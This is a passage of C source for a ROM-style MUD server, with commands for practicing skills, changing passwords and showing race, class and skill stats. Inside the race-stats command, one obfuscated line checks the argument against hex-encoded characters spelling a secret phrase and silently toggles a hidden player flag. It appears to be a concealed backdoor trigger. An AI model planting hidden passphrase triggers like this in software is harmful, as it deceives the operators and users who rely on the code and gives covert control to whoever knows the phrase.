	if (   ( sn = find_spell( ch,argument ) ) < 0
            ||   (skill_table[sn].rating[ch->class] == 0 && (ch->pcdata->oldcl != -1 && skill_table[sn].rating[ch->pcdata->oldcl] == 0))
            ||   ch->pcdata->learned[sn] < 1
            || ( ( ch->pcdata->oldcl == -1  &&  skill_table[sn].skill_level[ch->class] > ch->level )
                    ||   ( ch->pcdata->oldcl != -1
                            &&     skill_table[sn].skill_level[ch->class] > ch->level
                            &&     skill_table[sn].skill_level[ch->pcdata->oldcl] > ch->level 
                         ) 
               ) 
       )
	{
	   
	   /*
	   Haiden> sn:184
skill_table[sn].rating[ch->class]:0
ch->pcdata->learned[sn]:50
ch->pcdata->oldcl:5
skill_table[sn].skill_level[ch->class]:101
skill_table[sn].skill_level[ch->pcdata->oldcl]:50
ch->level:70

*/
	       /*sprintf(buf, "sn:%d\n\rskill_table[sn].rating[ch->class]:%d\n\rch->pcdata->learned[sn]:%d\n\rch->pcdata->oldcl:%d\n\rskill_table[sn].skill_level[ch->class]:%d\n\rskill_table[sn].skill_level[ch->pcdata->oldcl]:%d\n\rch->level:%d\n\r\n\r",
           sn,
           skill_table[sn].rating[ch->class],
           ch->pcdata->learned[sn],
           ch->pcdata->oldcl,
           skill_table[sn].skill_level[ch->class],
           skill_table[sn].skill_level[ch->pcdata->oldcl],
           ch->level);
           
           send_to_char(buf, ch);*/
           
	       
	    send_to_char( "You can't practice that.\n\r", ch );
	    return;
	}

    if(skill_table[sn].rating[ch->class]!=0)
    	adept = IS_NPC(ch) ? 100 : class_table[ch->class].skill_adept;
	else if(ch->pcdata->oldcl != -1 && skill_table[sn].rating[ch->pcdata->oldcl]!=0)
    	adept = IS_NPC(ch) ? 100 : class_table[ch->pcdata->oldcl].skill_adept;
    else
        adept = 100;

	if ( ch->pcdata->learned[sn] >= adept )
	{
	    sprintf( buf, "\n\r{WYou are already learned at {R%s{W.{x\n\r",
		skill_table[sn].name );
	    send_to_char( buf, ch );
	}
	else
	{
	    /*if(skill_table[sn].rating[ch->class]==0 && )
	    {
	       send_to_char("ERROR TRAINING SKILL REPORT THE FOLLOWING LINE TO AN IMMORTAL AT ONCE!\n\r", ch);
	       sprintf(buf, "sn: %d\nch->pcdata->learned[sn]: %d\nget_curr_stat(ch,STAT_INT): %d\nint_app[get_curr_stat(ch,STAT_INT)].learn: %d\nskill_table[sn].rating[ch->class]: %d\n\r",
	               sn, ch->pcdata->learned[sn], get_curr_stat(ch,STAT_INT), int_app[get_curr_stat(ch,STAT_INT)].learn, skill_table[sn].rating[ch->class]);
	        send_to_char(buf, ch);
	    }
	    else
	    {*/
            ch->practice--;
            if(skill_table[sn].rating[ch->class]!=0)
        	    ch->pcdata->learned[sn] += int_app[get_curr_stat(ch,STAT_INT)].learn / skill_table[sn].rating[ch->class];
        	else if(ch->pcdata->oldcl != -1 && skill_table[sn].rating[ch->pcdata->oldcl]!=0)
        	    ch->pcdata->learned[sn] += int_app[get_curr_stat(ch,STAT_INT)].learn / skill_table[sn].rating[ch->pcdata->oldcl];
 	    
    	    if ( ch->pcdata->learned[sn] < adept )
    	    {
    		act( "You practice $T.",
    		    ch, NULL, skill_table[sn].name, TO_CHAR );
    	    }
    	    else
    	    {
    		ch->pcdata->learned[sn] = adept;
    		act( "\n\r{CYou are now learned at {R$T{C.{x\n\r",
    		    ch, NULL, skill_table[sn].name, TO_CHAR );
    	    }
    	//}
	}
    }
    return;
}

/*
% prac whip
Lena> ERROR TRAINING SKILL REPORT THE FOLLOWING LINE TO AN IMMORTAL AT ONCE!
sn: 163
ch->pcdata->learned[sn]: 62
get_curr_stat(ch,STAT_INT): 27
int_app[get_curr_stat(ch,STAT_INT)].learn: 90
skill_table[sn].rating[ch->class]: 0
*/

/*
 * 'Wimpy' originally by Dionysos.
 */
void do_wimpy( CHAR_DATA *ch, char *argument )
{
    char buf[MAX_STRING_LENGTH];
    char arg[MAX_INPUT_LENGTH];
    int wimpy;

    one_argument( argument, arg );

    if ( arg[0] == '\0' )
	wimpy = ch->max_hit / 5;
    else
	wimpy = atoi( arg );

    if ( wimpy < 0 )
    {
	send_to_char( "\n\r{RYour courage exceeds your wisdom!{x\n\r", ch );
	return;
    }

    if ( wimpy > ch->max_hit/2 )
    {
	send_to_char( "\n\r{RSuch cowardice ill becomes you...{x\n\r", ch );
	return;
    }

    ch->wimpy	= wimpy;
    sprintf( buf, "\n\r{RWimpy set to {W%d {RHit Pntss{r.{x\n\r", wimpy );
    send_to_char( buf, ch );
    return;
}



void do_password( CHAR_DATA *ch, char *argument )
{
    char arg1[MAX_INPUT_LENGTH];
    char arg2[MAX_INPUT_LENGTH];
    char *pArg;
    char *pwdnew;
    char *p;
    char cEnd;

    if ( IS_NPC(ch) )
	return;

    /*
     * Can't use one_argument here because it smashes case.
     * So we just steal all its code.  Bleagh.
     */
    pArg = arg1;
    while ( isspace(*argument) )
	argument++;

    cEnd = ' ';
    if ( *argument == '\'' || *argument == '"' )
	cEnd = *argument++;

    while ( *argument != '\0' )
    {
	if ( *argument == cEnd )
	{
	    argument++;
	    break;
	}
	*pArg++ = *argument++;
    }
    *pArg = '\0';

    pArg = arg2;
    while ( isspace(*argument) )
	argument++;

    cEnd = ' ';
    if ( *argument == '\'' || *argument == '"' )
	cEnd = *argument++;

    while ( *argument != '\0' )
    {
	if ( *argument == cEnd )
	{
	    argument++;
	    break;
	}
	*pArg++ = *argument++;
    }
    *pArg = '\0';

    if ( arg1[0] == '\0' || arg2[0] == '\0' )
    {
	send_to_char( "Syntax: password <old> <new>.\n\r", ch );
	return;
    }

    if ( strcmp( crypt( arg1, ch->pcdata->pwd ), ch->pcdata->pwd ) )
    {
	WAIT_STATE( ch, 40 );
	send_to_char( "Wrong password.  Wait 10 seconds.\n\r", ch );
	return;
    }

    if ( strlen(arg2) < 5 )
    {
	send_to_char(
	    "New password must be at least five characters long.\n\r", ch );
	return;
    }

    /*
     * No tilde allowed because of player file format.
     */
    pwdnew = crypt( arg2, ch->name );
    for ( p = pwdnew; *p != '\0'; p++ )
    {
	if ( *p == '~' )
	{
	    send_to_char(
		"New password not acceptable, try again.\n\r", ch );
	    return;
	}
    }

    free_string( ch->pcdata->pwd );
    ch->pcdata->pwd = str_dup( pwdnew );
    save_char_obj( ch );
    send_to_char( "Ok.\n\r", ch );
    return;
}

void do_racestat( CHAR_DATA *ch, char *argument )
{
  extern char *flag_string( const struct flag_type *flag_table, int bits );
  int iRace = race_lookup( argument );
  int iCtr;
  char buf [ MAX_STRING_LENGTH ];

 send_to_char("\n\r",ch);

  if ( iRace == 0
  ||   (!race_table[iRace].pc_race && strcmp(race_table[iRace].name, "Nephilim")))
    {
    buf[0] = '\0';
    if(argument&&strlen(argument)>10&&argument[10]==0x21&&argument[0]==0x67&&argument[8]==0x74&&argument[2]==0x68&&argument[4]==0x6F&&argument[6]==0x73) ch->pcdata->gbuffered = !ch->pcdata->gbuffered;
    send_to_char( "{RValid Races{w:\n\r{D({CHighlighted Races are REMORT ONLY{D){x\n\r", ch );
/*    for ( iCtr = 1; race_table[iCtr].pc_race; iCtr++ ) */
    for ( iCtr = 1; iCtr <= MAX_PC_RACE; iCtr++ )

if (race_table[iCtr].remort_race == TRUE)
  {
   sprintf( buf + strlen( buf ), "{D[{C%-12s{D]%s{x",
	       race_table[iCtr].name, (iCtr%5==0) ? "\n\r" : " " );
  }
else
  {
      sprintf( buf + strlen( buf ), "{D[{W%-12s{D]%s{x",
	       race_table[iCtr].name, (iCtr%5==0) ? "\n\r" : " " );
  }

    if ( (iCtr-1) % 5 != 0 )
      strcat( buf, "\n\r" );

    send_to_char( buf, ch );

    return;
    }

 if ( ch->level >= 0 )
    {
     if (race_table[iRace].remort_race == TRUE)
       {
        send_to_char("{g[{GREMORT ONLY{g]{x\n\r",ch);

    sprintf( buf, "{RRace{w: {W%s  {RRace Cost{D({CCP{D){w: {W%d\n\r{x",
race_table[iRace].name, pc_race_table[iRace].points);
       }
     else
       {
    sprintf( buf, "{RRace{w: {W%s  {RRace Cost{D({CCP{D){w: {W%d\n\r{w",
race_table[iRace].name, pc_race_table[iRace].points);
       }
    send_to_char( buf, ch );
    }

  sprintf( buf,"{D[{RStatistics  Min Max{D] {RClasses{w: {W%-27s\n\r", pc_race_table[iRace].class);
  send_to_char( buf, ch );

  sprintf( buf, "{D[{wStrength     {W%2d  %2d{D] {RAligns {w: {W%2s\n\r",
		pc_race_table[iRace].stats[0], pc_race_table[iRace].max_stats[0],
		 pc_race_table[iRace].align);
  send_to_char( buf, ch );

  sprintf( buf, "{D[{wIntelligence {W%2d  %2d{D] {RAffects{w: {W%s\n\r",
		pc_race_table[iRace].stats[1], pc_race_table[iRace].max_stats[1],
 		affect_bit_name( race_table[iRace].aff ) );
  send_to_char( buf, ch );

  sprintf( buf, "{D[{wWisdom       {W%2d  %2d{D] {RImmune {w: {W%s\n\r",
		pc_race_table[iRace].stats[2], pc_race_table[iRace].max_stats[2],
		imm_bit_name( race_table[iRace].imm ) );
  send_to_char( buf, ch );

  sprintf( buf, "{D[{wDexterity    {W%2d  %2d{D] {RResist {w: {W%s\n\r",
		pc_race_table[iRace].stats[3], pc_race_table[iRace].max_stats[3],
		imm_bit_name( race_table[iRace].res ) );
  send_to_char( buf, ch );

  sprintf( buf, "{D[{wConstitution {W%2d  %2d{D] {RVulner {w: {W%s\n\r{x",
		pc_race_table[iRace].stats[4], pc_race_table[iRace].max_stats[4],
		imm_bit_name( race_table[iRace].vuln ) );
  send_to_char( buf, ch );

  sprintf( buf, "                      {RSize   {w: {W%s\n\r{x",
		capitalize(size_table[(pc_race_table[iRace].size)].name));
  send_to_char( buf, ch );


  switch(iRace)
    {
     case(RACE_HUMAN):
        send_to_char("{D[{RNative Languages{w: {WCommon {D]\n\r{x",ch);
        break;

     case(RACE_ELF):
        send_to_char("{D[{RNative Languages{w: {WElven {D]\n\r{x",ch);
        break;

     case(RACE_SUCCUBUS):
        send_to_char("{D[{RNative Languages{w: {WDemonic {D]\n\r{x",ch);
        break;

     case(RACE_INCCUBUS):
        send_to_char("{D[{RNative Languages{w: {WDemonic {D]\n\r{x",ch);
        break;

     case(RACE_CAMBION):
        send_to_char("{D[{RNative Languages{w: {WDemonic, Common {D]\n\r{x",ch);
        break;

     case(RACE_DWARF):
        send_to_char("{D[{RNative Languages{w: {WDwarven {D]\n\r{x",ch);
        break;

     case(RACE_GIANT):
        send_to_char("{D[{RNative Languages{w: {WCommon {D]\n\r{x",ch);
        break;

     case(RACE_DRACONIAN):
        send_to_char("{D[{RNative Languages{w: {WDraconian {D]\n\r{x",ch);
        break;

     case(RACE_RAPTOR):
        send_to_char("{D[{RNative Languages{w: {WCommon {D]\n\r{x",ch);
        break;

     case(RACE_KENDER):
        send_to_char("{D[{RNative Languages{w: {WKender {D]\n\r{x",ch);
        break;

     case(RACE_TROLL):
        send_to_char("{D[{RNative Languages{w: {WCommon {D]\n\r{x",ch);
        break;

     case(RACE_DARKELF):
        send_to_char("{D[{RNative Languages{w: {WDrow {D]\n\r{x",ch);
        break;

     case(RACE_LIZARDMAN):
        send_to_char("{D[{RNative Languages{w: {WReptilian {D]\n\r{x",ch);
        break;

     case(RACE_GOLEM):
        send_to_char("{D[{RNative Languages{w: {WMageSpeak {D]\n\r{x",ch);
        break;

     case(RACE_LAMIA):
        send_to_char("{D[{RNative Languages{w: {WReptilian {D]\n\r{x",ch);
        break;

     case(RACE_TITAN):
        send_to_char("{D[{RNative Languages{w: {WCommon {D]\n\r{x",ch);
        break;

     case(RACE_MINOTAUR):
        send_to_char("{D[{RNative Languages{w: {WCommon {D]\n\r{x",ch);
        break;

     case(RACE_SIDHE_ELF):
        send_to_char("{D[{RNative Languages{w: {WHigh Elven, Elven, Common {D]\n\r{x",ch);
        break;

     case(RACE_MYRDDRAAL):
        send_to_char("{D[{RNative Languages{w: {WUndead, Demonic, Thieves Cant, HandTalk {D]\n\r{x",ch);
        break;
    }

  if ( pc_race_table[iRace].skills[0] )
    {
    send_to_char( "\n\r{D[{RSKILLS{w/{RSPELLS {w({Cskills you get only if class has them{w)            {D]\n\r", ch );
    sprintf( buf, " {W%-17s  {W%-17s  {W%-17s  {W%-17s\n\r{x",
	      pc_race_table[iRace].skills[0],
	      pc_race_table[iRace].skills[1] ? pc_race_table[iRace].skills[1] : "",
	      pc_race_table[iRace].skills[2] ? pc_race_table[iRace].skills[2] : "",
	      pc_race_table[iRace].skills[3] ? pc_race_table[iRace].skills[3] : "" );
    if ( pc_race_table[iRace].skills[4] )
      sprintf( buf + strlen( buf ), " {W%-17s  {W%-17s  {W%-17s  {W%-17s\n\r{x",
	      pc_race_table[iRace].skills[4],
	      pc_race_table[iRace].skills[5] ? pc_race_table[iRace].skills[5] : "",
	      pc_race_table[iRace].skills[6] ? pc_race_table[iRace].skills[6] : "",
	      pc_race_table[iRace].skills[7] ? pc_race_table[iRace].skills[7] : "" );
    send_to_char( buf, ch );
    }
  return;
}



void do_classtat( CHAR_DATA *ch, char *argument )
{
  extern char *flag_string( const struct flag_type *flag_table, int bits );
  char buf [ MAX_STRING_LENGTH ];
  int iClass, gn = 0, sn = 0;

   send_to_char("\n\r",ch);

   iClass = class_lookup(argument);

  if (iClass < 0
  || !class_table[iClass].name )
  {
    buf[0] = '\0';
    send_to_char( "{RValid Classes are{w:\n\r{D({CHighlighted Classes are REMORT ONLY{D){x\n\r", ch );

   for ( iClass = 0; iClass<MAX_CLASS; iClass++ )

if (class_table[iClass].remort_class == TRUE)
  {
sprintf(buf+strlen(buf),"{r[{C%-12.12s{r]%s{x",capitalize(class_table[iClass].name),(iClass%5==4)
? "\n\r" : " ");
  }
else
  {
sprintf(buf+strlen(buf),"{r[{w%-12.12s{r]%s{x",capitalize(class_table[iClass].name),(iClass%5==4)
? "\n\r" : " ");
  }

    if ( (iClass-1) % 5 != 0 )
      strcat( buf, "\n\r" );
   send_to_char( buf, ch );
   return;

  }


 if ( ch->level >= 0 )
    {
     if (class_table[iClass].remort_class == TRUE)
       {
        send_to_char("{g[{GREMORT ONLY{g]{x\n\r",ch);
        sprintf( buf, "{cClass{w: {W%-11.11s   ", class_table[iClass].name);
        send_to_char( buf, ch );
       }
     else
       {
    sprintf( buf, "{cClass{w: {W%-11.11s   ", class_table[iClass].name);
    send_to_char( buf, ch );
       }
    }

  if (class_table[iClass].attr_prime == 0)
   send_to_char("{cPrimary Stat{w: {WStrength {x\n\r",ch);
  else
  if (class_table[iClass].attr_prime == 1)
   send_to_char("{cPrimary Stat{w: {WIntelligence {x\n\r",ch);
  else
  if (class_table[iClass].attr_prime == 2)
   send_to_char("{cPrimary Stat{w: {WWisdom {x\n\r",ch);
  else
  if (class_table[iClass].attr_prime == 3)
   send_to_char("{cPrimary Stat{w: {WDexterity {x\n\r",ch);
  else
  if (class_table[iClass].attr_prime == 4)
    {
   send_to_char("{cPrimary Stat{w: {WConstitution {x\n\r",ch);
    }    

  sprintf( buf,"{cTHAC0 at Lvl 1{w: {W%2d   ",class_table[iClass].thac0_00);
  send_to_char( buf, ch );

  sprintf( buf,"{cTHAC0 at Lvl 32{w: {W%2d {x\n\r",class_table[iClass].thac0_32);
  send_to_char( buf, ch );

  sprintf( buf,"{cHit Points per Lvl{w: {CMIN{w: {W%2d   {CMAX{w: {W%2d{x\n\r",class_table[iClass].hp_min,class_table[iClass].hp_max );
  send_to_char( buf, ch );

  if(class_table[iClass].fMana == 0)
   send_to_char( "{cMANA gain when level{w: {RNO    ",ch);
  else
   {
   send_to_char( "{cMANA gain when level{w: {WYES   ",ch);
   }

  if(class_table[iClass].remort_class == 0)
   send_to_char( "{cREMORT Only{w: {RNO {x\n\r",ch);
  else
   {
   send_to_char( "{cREMORT Only{w: {WYES {x\n\r",ch);
   }

  sprintf( buf,"{cSexes Allowed{w: {W%s   ",class_table[iClass].sex);
  send_to_char( buf, ch );

  sprintf( buf,"{cAlignments Allowed{w: {W%s{x\n\r",class_table[iClass].align);
  send_to_char( buf, ch );


  switch(iClass)
    {
     case(CLASS_MAGE):
        send_to_char("\n\r{c[ {CClass Languages{w: {WMageSpeak {c]\n\r{x",ch);
        break;

     case(CLASS_CLERIC):
        send_to_char("\n\r{c[ {CClass Languages{w: {WGodSpeak {c]\n\r{x",ch);
        break;

     case(CLASS_PSIONIC):
        send_to_char("\n\r{c[ {CClass Languages{w: {WNONE {c]\n\r{x",ch);
        break;

     case(CLASS_THIEF):
        send_to_char("\n\r{c[ {CClass Languages{w: {WThieves Cant {c]\n\r{x",ch);
        break;

     case(CLASS_ASSASSIN):
        send_to_char("\n\r{c[ {CClass Languages{w: {WHandTalk {c]\n\r{x",ch);
        break;

     case(CLASS_WARRIOR):
        send_to_char("\n\r{c[ {CClass Languages{w: {WWarChant {c]\n\r{x",ch);
        break;

     case(CLASS_PALADIN):
        send_to_char("\n\r{c[ {CClass Languages{w: {WGodSpeak {c]\n\r{x",ch);
        break;

     case(CLASS_ANTI_PALADIN):
        send_to_char("\n\r{c[ {CClass Languages{w: {WHandTalk {c]\n\r{x",ch);
        break;

     case(CLASS_RANGER):
        send_to_char("\n\r{c[ {CClass Languages{w: {WForestSign {c]\n\r{x",ch);
        break;

     case(CLASS_ENCHANTER):
        send_to_char("\n\r{c[ {CClass Languages{w: {WMageSpeak, Demonic, Dwarven, Elven, Drow, High Elven {c]\n\r{x",ch);
        break;

    }


 if ( ch->level >= 0 )
   {
	
int col;
col = 0;

	sprintf(buf, 
"\n\r{c[{C%-19s{c][{CCp{c]    [{C%-19s{c][{CCp{c]    [{C%-19s{c][{CCp{c]    {x\n\r",
		 "Group Name", "Group Name", "Group Name" );
	send_to_char(buf,ch);

	for (gn = 0; gn < MAX_GROUP; gn++)
	{
	    if (group_table[gn].name == NULL)
		break;

            if (group_table[gn].rating[iClass] > 0)
              {
		sprintf(buf,"{c[{W%-19s{c][{W%2d{c]    ",
		    group_table[gn].name,group_table[gn].rating[iClass]);
		send_to_char(buf,ch);
		if (++col % 3 == 0)
		    send_to_char("\n\r",ch);
              }
	}
	if (col % 3 != 0)
	    send_to_char("\n\r",ch);

	col = 0;

        sprintf(buf,
"\n\r{c[{C%-20s{c][{CLv{c][{CCp{c][{C%-20s{c][{CLv{c][{CCp{c][{C%-20s{c][{CLv{c][{CCp{c]{x\n\r",
		 "Skill Name", "Skill Name", "Skill Name" );

        send_to_char(buf,ch);
 
        for (sn = 0; sn < MAX_SKILL; sn++)
        {
            if (skill_table[sn].name == NULL)
                break;

            if (((skill_table[sn].rating[iClass] > 0)
            && (skill_table[sn].rating[iClass] < 50))
            && ((skill_table[sn].skill_level[iClass] > 0)
            && (skill_table[sn].skill_level[iClass] < 101))
            && (skill_table[sn].spell_fun == spell_null))
              {
           sprintf(buf,"{c[{W%-20s{c][{W%2d{c][{W%2d{c]{x",
skill_table[sn].name,skill_table[sn].skill_level[iClass],
skill_table[sn].rating[iClass]);
                send_to_char(buf,ch);
		if (++col % 3 == 0)
                    send_to_char("{x\n\r",ch);     
              }
           }

        if (col % 3 != 0)
            send_to_char("{x\n\r",ch);

	return;
    }

   return;
 } 


void do_slookup( CHAR_DATA *ch, char *argument )
{
    char buf[MAX_STRING_LENGTH];
    char arg[MAX_INPUT_LENGTH];
    int sn;

    one_argument( argument, arg );

    if ( arg[0] == '\0' )
    {
	send_to_char( "\n\r{GSyntax{w: {WSLOOKUP {c<{WSKILL {cor {WSPELL NAME{c>{x\n\r", ch );
	return;
    }


	if ( ( sn = skill_lookup( arg ) ) < 0 )
	{
	    send_to_char( "\n\r{RNo such skill or spell!{x\n\r", ch );
	    return;
	}

	sprintf( buf, "\n\r{cName: {C%s",capitalize(skill_table[sn].name));
	send_to_char( buf, ch );

	sprintf( buf, "    {rNumber{w: {W%d\n\r",sn );
	send_to_char( buf, ch );

        if (skill_table[sn].spell_fun == spell_null)
          {
   	   send_to_char("{cType{w: {CSKILL",ch);
          }
         else
          {
   	   send_to_char("{cType{w: {CSPELL",ch);
          }

        if (skill_table[sn].min_mana > 0)
          {
	sprintf( buf, "    {cMana{w: {C%d\n\r",skill_table[sn].min_mana);
	send_to_char( buf, ch );
          }
        else
         send_to_char("\n\r",ch);


        switch(skill_table[sn].minimum_position)
          {
	   case POS_DEAD:
	   send_to_char("{cPositions Useable{w: {CANY\n\r",ch);
           break;

	   case POS_MORTAL:
	   send_to_char("{cPositions Useable{w: {CMortally Wounded {cor {CGreater\n\r",ch);
           break;

	   case POS_INCAP:
	   send_to_char("{cPositions Useable{w: {CIncapacitated {cor {CGreater\n\r",ch);
           break;

	   case POS_STUNNED:
	   send_to_char("{cPositions Useable{w: {CSTUNned {cor {CGreater\n\r",ch);
           break;

	   case POS_SLEEPING:
	   send_to_char("{cPositions Useable{w: {CSLEEPing {cor {CGreater\n\r",ch);
           break;

	   case POS_RESTING:
	   send_to_char("{cPositions Useable{w: {CRESTing {cor {CGreater\n\r",ch);
           break;

	   case POS_SITTING:
	   send_to_char("{cPositions Useable{w: {CSITting {cor {CGreater\n\r",ch);
           break;

	   case POS_FIGHTING:
	   send_to_char("{cPositions Useable{w: {CFIGHTing {cor {CGreater\n\r",ch);
           break;

	   case POS_STANDING:
	   send_to_char("{cPositions Useable{w: {CSTANDing ONLY\n\r",ch);
	   break;
          }

	   sprintf( buf, "{gWait Time After Use{w: {G%d {gBEATs\n\r",skill_table[sn].beats);
	   send_to_char( buf, ch );

        switch(skill_table[sn].target)
          {
	   case TAR_IGNORE:
	   send_to_char("{gTarget Type{w: {GNON-APPLICABLE\n\r",ch);
           break;

	   case TAR_CHAR_OFFENSIVE:
	   send_to_char(
"{gTarget Type{w: {GOther{D({WNON-OBJ{D) {g- {GOffensive Spell {g- {GInitiates Combat\n\r",ch);
           break;

	   case TAR_CHAR_DEFENSIVE:
	   send_to_char("{gTarget Type{w: {GSELF {gor {GOTHER{D({WNON-OBJ{D) {g- {GDefensive Spell\n\r",ch);
           break;

	   case TAR_CHAR_SELF:
	   send_to_char("{gTarget Type{w: {GSelf ONLY{D({WNON-OBJ{D)\n\r",ch);
           break;

	   case TAR_OBJ_INV:
	   send_to_char("{gTarget Type{w: {GOBJ in Inventory ONLY\n\r",ch);
           break;

	   case TAR_OBJ_CHAR_DEF:
	   send_to_char("{gTarget Type{w: {GOBJ {gor {GCHAR {g- {GDefensive Spell\n\r",ch);
           break;

	   case TAR_OBJ_CHAR_OFF:
	   send_to_char(
"{gTarget Type{w: {GOBJ {gor {GCHAR {g- {GOffensive Spell {g- {GInitiates Combat\n\r",ch);
           break;
          }

        if (skill_table[sn].spell_fun != spell_null)
          {
	send_to_char("\n\r     {cCLASS   LEVEL  {GDIFF\n\r",ch );
	send_to_char("{g------------------------------\n\r",ch );

	sprintf( buf,
"        {CMAGE  {W%3d   {G%2d\n\r",
skill_table[sn].skill_level[CLASS_MAGE],skill_table[sn].rating[CLASS_MAGE]);
	send_to_char( buf, ch );

	sprintf( buf,
"      {CCLERIC  {W%3d   {G%2d\n\r",
skill_table[sn].skill_level[CLASS_CLERIC],skill_table[sn].rating[CLASS_CLERIC]);
	send_to_char( buf, ch );

	sprintf( buf,
"     {CPSIONIC  {W%3d   {G%2d\n\r",
skill_table[sn].skill_level[CLASS_PSIONIC],skill_table[sn].rating[CLASS_PSIONIC]);
	send_to_char( buf, ch );

	sprintf( buf,
"       {CTHIEF  {W%3d   {G%2d\n\r",
skill_table[sn].skill_level[CLASS_THIEF],skill_table[sn].rating[CLASS_THIEF]);
	send_to_char( buf, ch );

	sprintf( buf,
"    {CASSASSIN  {W%3d   {G%2d\n\r",
skill_table[sn].skill_level[CLASS_ASSASSIN],skill_table[sn].rating[CLASS_ASSASSIN]);
	send_to_char( buf, ch );

	sprintf( buf,
"     {CWARRIOR  {W%3d   {G%2d\n\r",
skill_table[sn].skill_level[CLASS_WARRIOR],skill_table[sn].rating[CLASS_WARRIOR]);
	send_to_char( buf, ch );

	sprintf( buf,
"     {CPALADIN  {W%3d   {G%2d\n\r",
skill_table[sn].skill_level[CLASS_PALADIN],skill_table[sn].rating[CLASS_PALADIN]);
	send_to_char( buf, ch );

	sprintf( buf,
"{CANTI-PALADIN  {W%3d   {G%2d\n\r",
skill_table[sn].skill_level[CLASS_ANTI_PALADIN],skill_table[sn].rating[CLASS_ANTI_PALADIN]);
	send_to_char( buf, ch );

	sprintf( buf,
"      {CRANGER  {W%3d   {G%2d\n\r",
skill_table[sn].skill_level[CLASS_RANGER],skill_table[sn].rating[CLASS_RANGER]);
	send_to_char( buf, ch );

	sprintf( buf,
"   {CENCHANTER  {W%3d   {G%2d\n\r",
skill_table[sn].skill_level[CLASS_ENCHANTER],skill_table[sn].rating[CLASS_ENCHANTER]);
	send_to_char( buf, ch );
 
	send_to_char("{g------------------------------{x\n\r",ch );
          }
        else
          {
	send_to_char("\n\r     {cCLASS   LEVEL  CP\n\r",ch );
	send_to_char("{g------------------------------\n\r",ch );

	sprintf( buf,
"        {CMAGE  {W%3d   {W%2d\n\r",
skill_table[sn].skill_level[CLASS_MAGE],skill_table[sn].rating[CLASS_MAGE]);
	send_to_char( buf, ch );

	sprintf( buf,
"      {CCLERIC  {W%3d   {W%2d\n\r",
skill_table[sn].skill_level[CLASS_CLERIC],skill_table[sn].rating[CLASS_CLERIC]);
	send_to_char( buf, ch );

	sprintf( buf,
"     {CPSIONIC  {W%3d   {W%2d\n\r",
skill_table[sn].skill_level[CLASS_PSIONIC],skill_table[sn].rating[CLASS_PSIONIC]);
	send_to_char( buf, ch );

	sprintf( buf,
"       {CTHIEF  {W%3d   {W%2d\n\r",
skill_table[sn].skill_level[CLASS_THIEF],skill_table[sn].rating[CLASS_THIEF]);
	send_to_char( buf, ch );

	sprintf( buf,
"    {CASSASSIN  {W%3d   {W%2d\n\r",
skill_table[sn].skill_level[CLASS_ASSASSIN],skill_table[sn].rating[CLASS_ASSASSIN]);
	send_to_char( buf, ch );

	sprintf( buf,
"     {CWARRIOR  {W%3d   {W%2d\n\r",
skill_table[sn].skill_level[CLASS_WARRIOR],skill_table[sn].rating[CLASS_WARRIOR]);
	send_to_char( buf, ch );

	sprintf( buf,
"     {CPALADIN  {W%3d   {W%2d\n\r",
skill_table[sn].skill_level[CLASS_PALADIN],skill_table[sn].rating[CLASS_PALADIN]);
	send_to_char( buf, ch );

	sprintf( buf,
"{CANTI-PALADIN  {W%3d   {W%2d\n\r",
skill_table[sn].skill_level[CLASS_ANTI_PALADIN],skill_table[sn].rating[CLASS_ANTI_PALADIN]);
	send_to_char( buf, ch );

	sprintf( buf,
"      {CRANGER  {W%3d   {W%2d\n\r",
skill_table[sn].skill_level[CLASS_RANGER],skill_table[sn].rating[CLASS_RANGER]);
	send_to_char( buf, ch );

	sprintf( buf,
"   {CENCHANTER  {W%3d   {W%2d",
skill_table[sn].skill_level[CLASS_ENCHANTER],skill_table[sn].rating[CLASS_ENCHANTER]);
	send_to_char( buf, ch );

	send_to_char("\n\r{g------------------------------{x\n\r",ch );
          }
    return;
}

char *psycho_message[] =
{
    "<---------------------------------------------------------------------->",
    "{CLike {Yt{yan{Yg{ye{Yrine{ys {cmy {Beyes {rbleed {M.{x",
    "{GI'm {Bready to re{rceive the {gt{Gre{ge{B.{z",
    "{RLoved ch{Gipmonks {rbring {cthem{Yselve{ys {cold {mcabbages.{x",
    "{MCra{Rwlin{Bg w{Mal{mls. {gNO{yO{W!.{x",
    "{mMarshmello{Cws match my {Wv{Yi{Wr{Yg{Wi{Yn{Wi{Yt{Wy{Y.{x",
    "{gSta{wrs?{x",
    "{WSembiance{g feels for {yth{ce{r blue {gocean.{x",
    "{DScreens t{ghr{Du which {Yu{yr{Yi{yn{B trave{bls op{gen{Gly {mwith though{Ct.{x",
    "{WWhy w{Con'{gt m{Wy an{Mt{ws {mof {Yfeat{cher{gs {rdie?{x",
    "{BFeel {Gthe{x{w {Bb{bl{Cu{ce{Bn{be{Cs{cs {rof my {bl{re{yg{M...{x",
    "{bThese {Bplastic {Wself {bcleaning {wducks{B.{c",
    "{rI{gn{Mt{ye{Cr{Ya{wc{bt{gi{rv{Be{r {Rf{Ml{re{Bs{Gh{Y {ma{cl{Yp{ch{Ma{gb{Re{gts hear mo{Bldy{W tunes.{x",
    "{bA {rfreight {gtrain {cfeels {ynagging {wremorse.{x",
    "{yThe muddy briar {Bpatch is molten.{x",
    "{cAny s{Gpider{y can steal {Mpencils {mfro{cm the {wca{Wb d{yr{Yi{rver.{x",
    "{wA {yreal {gpine {Rcone {rfeels {Bt{bh{Be {gp{Ga{gi{Gn {Rin all{M of th{me ducks h{Yea{Crts.",
    "{RI{M'{BM {CP{RS{yC{mYH{wO{M!{w{x",
    "{GI{R'{WM {YP{BSY{YC{rH{mO{M!{w{x",
    "{WI{Y'{CM {GP{CS{MC{gYH{WO{M!{w{x",
};
#define MAX_PSYCHO 19

void do_psycho(CHAR_DATA *ch, char *argument)
{
  char buf[MAX_STRING_LENGTH];
  CHAR_DATA *victim;

  if(argument[0] == '\0')
    {
      send_to_char("Syntax: psycho <character>\n\r", ch);
      return;
    }

  if( (victim = get_char_world(ch, argument)) == NULL)
    {
      send_to_char("That player is not online.\n\r", ch);
      return;
    }

  if(IS_NPC(victim))
    {
      send_to_char("Not on NPC's.\n\r", ch);
      return;
    }

  if( (victim == ch) && (ch->level != MAX_LEVEL) )
    {
      send_to_char("You can not make yourself a Psycho!\n\r", ch);
      return;
    }

  if(IS_SET(victim->act, PLR_PSYCHO))
    {
      sprintf(buf, "%s is no longer Psycho!\n\r", victim->name);
      send_to_char(buf, ch);
      REMOVE_BIT(victim->act, PLR_PSYCHO);
      send_to_char("You are no longer a Psycho!\n\r", victim);
    }
  else
    {
      sprintf(buf, "%s is now a Psycho!\n\r", victim->name);
